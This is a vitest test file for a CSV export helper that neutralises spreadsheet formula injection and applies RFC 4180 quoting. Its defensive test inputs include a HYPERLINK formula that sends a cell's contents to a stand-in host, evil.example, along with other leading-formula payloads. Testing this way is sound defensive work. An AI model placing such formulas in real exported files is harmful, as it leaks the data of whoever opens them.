/**
 * Proof-bundle CSV escaping — EC-P6-25 / EC-P5-15.
 *
 * Phase 5 deliberately stored formula-shaped cells RAW on import, on the
 * grounds that the danger is downstream. This is downstream: the bundle exists
 * to be shared, which means it exists to be opened in a spreadsheet by someone
 * other than its author. That is precisely the situation the attack needs.
 */

import { describe, expect, it } from "vitest";

import { escapeCell, toCsv } from "@/lib/export/csv";

describe("formula injection", () => {
  it.each(["=cmd()", "+1+1", "-2+3", "@SUM(A1)", "\tlead", "\rlead"])(
    "neutralises a cell starting with %j",
    (payload) => {
      const cell = escapeCell(payload);
      // The apostrophe must be INSIDE the quotes — that is what the
      // spreadsheet acts on when it parses the field.
      expect(cell.startsWith(`"'`)).toBe(true);
      expect(cell).toContain(payload.replace(/"/g, '""'));
    },
  );

  it("escapes the classic exfiltration payload", () => {
    const attack = '=HYPERLINK("http://evil.example/?leak="&A1,"click")';
    const cell = escapeCell(attack);
    expect(cell.startsWith(`"'=HYPERLINK`)).toBe(true);
  });

  it("leaves an honest value untouched apart from quoting", () => {
    // Over-escaping is its own failure: a proof artifact full of stray
    // apostrophes is one nobody trusts.
    expect(escapeCell("Acme Analytics")).toBe('"Acme Analytics"');
    expect(escapeCell("priya@acme.com")).toBe('"priya@acme.com"');
  });

  it("does not treat an interior = or @ as dangerous", () => {
    // Only a LEADING character triggers formula parsing.
    expect(escapeCell("a=b")).toBe('"a=b"');
    expect(escapeCell("mail priya@acme.com")).toBe('"mail priya@acme.com"');
  });
});

describe("RFC 4180 shape", () => {
  it("doubles embedded quotes", () => {
    expect(escapeCell('She said "hi"')).toBe('"She said ""hi"""');
  });

  it("keeps commas and newlines inside a quoted field", () => {
    const cell = escapeCell("Bengaluru, India\nRemote");
    expect(cell).toBe('"Bengaluru, India\nRemote"');
  });

  it("renders null and undefined as empty, never as the words", () => {
    expect(escapeCell(null)).toBe('""');
    expect(escapeCell(undefined)).toBe('""');
  });

  it("writes CRLF rows, which is what Excel respects", () => {
    const csv = toCsv(["a", "b"], [["1", "2"]]);
    expect(csv).toBe('"a","b"\r\n"1","2"\r\n');
  });

  it("escapes headers too — a column name can be attacker-supplied", () => {
    expect(toCsv(["=evil"], [])).toBe(`"'=evil"\r\n`);
  });
});
